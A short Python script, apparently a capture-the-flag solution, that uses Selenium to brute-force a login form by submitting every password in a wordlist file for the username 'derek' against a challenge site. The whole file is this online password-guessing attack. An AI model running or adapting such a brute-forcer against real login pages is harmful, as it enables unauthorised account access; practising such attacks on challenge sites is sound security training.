#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import string
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time


def setup(wbpg):
    driver = webdriver.Firefox()
    driver.get(wbpg)
    wordlistfile = open("wordlist.txt","r")
    wordlist = wordlistfile.readlines()
    for word in wordlist:
        user = driver.find_element_by_id("username")
        passw = driver.find_element_by_id("password")
        ent = driver.find_element_by_id("submit")
        user.send_keys("derek")
        passw.send_keys(word)
        ent.send_keys(Keys.RETURN)
        time.sleep(0.25)
        print(word)
    
if __name__ == "__main__":
    webpage = "https://theguessibilityfactor.web.baectf.com/login.php#"
    setup(webpage)
    